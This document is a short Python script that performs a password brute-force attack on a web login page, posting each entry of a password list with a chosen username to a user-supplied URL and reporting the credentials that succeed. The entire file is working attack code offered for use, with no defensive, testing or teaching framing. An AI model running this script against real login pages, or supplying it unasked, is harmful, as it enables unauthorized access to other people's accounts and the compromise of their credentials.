import requests

def brute_force(url, username, password_file):
    with open(password_file, 'r') as f:
        passwords = f.readlines()
        
    for password in passwords:
        password = password.strip()
        data = {'username': username, 'password': password}
        response = requests.post(url, data=data)
        if "Invalid credentials" not in response.text:
            print(f"[+] Login successful with {username}:{password}")
            return True
    print("[+] Brute force attack failed!")
    return False

if __name__ == "__main__":
    target_url = input("Enter the URL of the login page: ")
    username = input("Enter the username: ")
    password_file = input("Enter the password list file: ")
    brute_force(target_url, username, password_file)
